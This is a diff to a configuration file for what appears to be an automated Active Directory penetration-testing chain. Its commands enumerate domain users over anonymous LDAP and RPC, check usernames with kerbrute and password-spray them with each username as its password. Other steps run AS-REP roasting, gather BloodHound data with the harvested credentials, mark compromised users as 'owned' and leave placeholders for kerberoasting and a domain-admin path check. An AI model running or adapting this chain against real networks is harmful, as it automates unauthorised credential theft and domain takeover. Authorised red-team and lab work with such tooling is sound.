@@ -4,13 +4,13 @@ cmd = "nmap -v -Pn {ip}"
 
   [[nmap.patterns]]
   "Discovered open port (445|139)" = [
-    "SMB_SERVICE_FOUND",
-    "RPC_SERVICE_FOUND"
+    "SMB SERVICE FOUND",
+    "RPC SERVICE FOUND"
   ]
 
   [[nmap.patterns]]
   "Discovered open port (389)" = [
-    "LDAP_SERVICE_FOUND"
+    "LDAP SERVICE FOUND"
   ]
 
 [smbclient-anonymous]
@@ -19,7 +19,7 @@ cmd = "smbclient -U ''%'' \\\\\\\\{ip}\\\\IPC$ -c 'AZERTY;q'"
 
   [[smbclient-anonymous.patterns]]
   "AZERTY: command not found" = [
-    "SMB_ACCESS"
+    "SMB ANONYMOUS ACCESS ALLOWED"
   ]
 
 [ldap-base]
@@ -37,41 +37,74 @@ cmd = "ldapsearch -LLL -x -h {ip} -s base"
 
   [[ldap-base.patterns]]
   "rootDomainNamingContext: DC=.*$" = [
-    "LDAP_DOMAIN_CONTROLLER"
+    "TARGET IS A DOMAIN CONTROLLER"
   ]
 
 [ldap-anonymous-dc]
 name = "ldap-anonymous-dc"
-cmd = "ldapsearch -LLL -x -h {ip} -b '{domain_dn}' > {output_dir}ldap-anonymous-dc.txt"
+cmd = """
+ldapsearch -LLL -x -h {ip} -b '{domain_dn}' > {output_dir}ldap-anonymous-dc.txt;
+result=$(find {output_dir}ldap-anonymous-dc.txt -size +5);
+if [ ! -z $result ]
+then
+    echo "SUCCESS";
+fi"""
 
   [[ldap-anonymous-dc.store_static]]
   ldap_dc_output_file = "{output_dir}ldap-anonymous-dc.txt"
 
+  [[ldap-anonymous-dc.patterns]]
+  "SUCCESS" = [
+    "LDAP ANONYMOUS ACCESS TO DC"
+  ]
+
+[extract-ldap-users]
+name = "extract-ldap-users"
+cmd = """
+cat {output_dir}ldap-anonymous-dc.txt \
+| grep -A 30 "objectClass: user" \
+| grep "sAMAccountName:" \
+| cut -d" " -f2 \
+| tr '[a-z]' '[A-Z]' > {output_dir}ldap_users.lst;
+cat {output_dir}ldap_users.lst;
+[ -s {output_dir}ldap_users.lst ] \
+&& echo '###USERS FOUND'"""
+
+  [[extract-ldap-users.append_array]]
+  usernames = "^((?!###USERS).*)$" 
+  
+  [[extract-ldap-users.patterns]]
+  "USERS FOUND" = [
+    "VALID USERNAME FOUND"
+  ]
+
 [rpc-anonymous]
 name = "rpc-anonymous"
-cmd = "rpcclient -U ''%'' {ip} -c 'AZERTY;quit' 2>/dev/null'"
+cmd = "rpcclient -U ''%'' {ip} -c 'AZERTY;quit' 2>/dev/null"
 
   [[rpc-anonymous.patterns]]
   "command not found: AZERTY" = [
-    "RPC_ACCESS"
+    "RPC ANONYMOUS ACCESS ALLOWED"
   ]
 
 [rpc-list-users]
 name = "rpc-list-users"
-cmd = """rpcclient -U ''%'' {ip} -c 'enumdomusers;quit' 2>/dev/null | cut -d[ -f2 | cut -d] -f1 > {output_dir}rpc-users.lst; 
-[ -s {output_dir}rpc-users.lst ] && grep -vq 'result was' {output_dir}rpc_users.lst && echo 'USERS FOUND'"""
+cmd = """rpcclient -U ''%'' {ip} -c 'enumdomusers;quit' 2>/dev/null \
+| cut -d[ -f2 \
+| cut -d] -f1 \
+| tr '[a-z]' '[A-Z]' > {output_dir}rpc_users.lst;
+cat {output_dir}rpc_users.lst;
+[ -s {output_dir}rpc_users.lst ] \
+&& grep -vq 'result was' {output_dir}rpc_users.lst \
+&& echo 'USERS FOUND'"""
 
-  [[rpc-list-users.store_static]]
-  users_file = "{output_dir}rpc-users.lst"
+  [[rpc-list-users.append_array]]
+  usernames = "^((?!USERS FOUND).*)$" 
 
   [[rpc-list-users.patterns]]
   "USERS FOUND" = [
-    "RPC_USER_LIST"
+    "VALID USERNAME FOUND"
   ]
-
-[hydra-nsr-spraying]
-name = "hydra-nsr-spraying"
-cmd = "hydra -L {users_file} -e nsr smb://{ip}"
 
 [asreproast]
 name = "asreproast"
@@ -83,7 +116,7 @@ cmd = """GetNPUsers.py {domain_name}/ -usersfile {users_file} -no-pass -dc-ip {i
 
   [[asreproast.patterns]]
   "TGT FOUND" = [
-    "USER_TGT_FOUND"
+    "TGT HASH FOUND"
   ]
 
 [extract-links-html]
@@ -118,3 +151,85 @@ cmd = "python3 ~/programs/reconjs/reconjs.py -r -d {output_dir}reconjs -u {url}"
 name = "unsourcemap"
 cmd = '''mkdir -p {output_dir}unsourcemap && outfile_name=`echo "{array_element}" | awk -F/ '{{ print $NF }}' | cut -d. -f1` && python3 /home/layno/programs/reconjs/unwebpack_sourcemap.py --make-directory --local {array_element} {output_dir}unsourcemap/$outfile_name/'''
 iterate_over = "map_file_paths"
+
+[kerbrute-userenum]
+name = "kerbrute-userenum"
+cmd = """~/programs/kerbrute/kerbrute userenum --dc {ip} -d {domain_name} {potential_usernames_file}"""
+
+  [[kerbrute-userenum.append_array]]
+  "usernames" = '''\[\+\] VALID USERNAME:\s*(.*)\x1b'''
+
+  [[kerbrute-userenum.patterns]]
+  "VALID USERNAME" = [
+    "VALID USERNAME FOUND"
+  ]
+
+[kerbrute-test-user-as-pass]
+name = "kerbrute-test-user-as-pass"
+cmd = """lockfile-create --lock-name {output_dir}kerbrute.lock;
+python3 -c "a={usernames}; print('\\n'.join(a))" > {output_dir}usernames.tmp \
+&& sort -u {output_dir}usernames.tmp -f {output_dir}usernames.tmp;
+if [ -s {output_dir}usernames_validated.tmp ]; then \
+diff {output_dir}usernames.tmp {output_dir}usernames_validated.tmp \
+| grep "<" | sed -e 's/< //' > {output_dir}usernames_to_validate.tmp;
+else
+touch {output_dir}usernames_validated.tmp;
+mv {output_dir}usernames.tmp {output_dir}usernames_to_validate.tmp; 
+fi
+cat {output_dir}usernames_to_validate.tmp >> {output_dir}usernames_validated.tmp;
+~/programs/kerbrute/kerbrute passwordspray --user-as-pass --dc {ip} -d {domain_name} {output_dir}usernames_to_validate.tmp;
+lockfile-remove --lock-name {output_dir}kerbrute.lock;"""
+
+  [[kerbrute-test-user-as-pass.append_array]]
+  "credentials" = '''\[\+\] VALID USERNAME:\s*(.*)\x1b'''
+
+  [[kerbrute-test-user-as-pass.patterns]]
+  "VALID CREDENTIALS" = [
+    "VALID CREDENTIALS FOUND"
+  ]
+
+[bloodhound-gather-info]
+name = "bloodhound-gather-info"
+cmd = "bloodhound-python -u {user_default} -p {password_default} -d {domain_name} -dc {dc_dns} -gc {ip} -c all"
+
+  [[bloodhound-gather-info.store]]
+  bloodhound_gathered = "(Done)$"
+
+  [[bloodhound-gather-info.patterns]]
+  "Done$" = [
+    "BLOODHOUND GATHERED"
+  ]
+
+[bloodhound-add-owned-users]
+name = "bloodhound-add-owned-users"
+cmd = """if [[ {bloodhound_gathered} == 'Done' ]]; 
+then
+    lockfile-create --lock-name {output_dir}owned_users.lock;
+    python3 -c "a={credentials}; print('\\n'.join(a))" | cut -d':' -f1  > {output_dir}owned_users.lst \
+    && sort -u {output_dir}owned_users.lst -f {output_dir}owned_users.lst;
+    python3 ~/programs/bloodhound/mark_as_owned.py -l {output_dir}owned_users.lst -d {domain_name};
+    lockfile-remove --lock-name {output_dir}owned_users.lst;
+fi"""
+
+  [[bloodhound-add-owned-users.patterns]]
+  "Done$" = [
+    "OWNED USERS ADDED"
+  ]
+
+[kerberoast]
+name = "kerberoast"
+cmd = ""
+
+  [[kerberoast.patterns]]
+  "" = [
+    "TGS HASH FOUND"
+  ]
+
+[bloodhound-check-shortest-path]
+name = "bloodhound-check-shortest-path"
+cmd = ""
+
+  [[bloodhound-check-shortest-path.patterns]]
+  "" = [
+    "PATH TO DA FOUND"
+  ] 
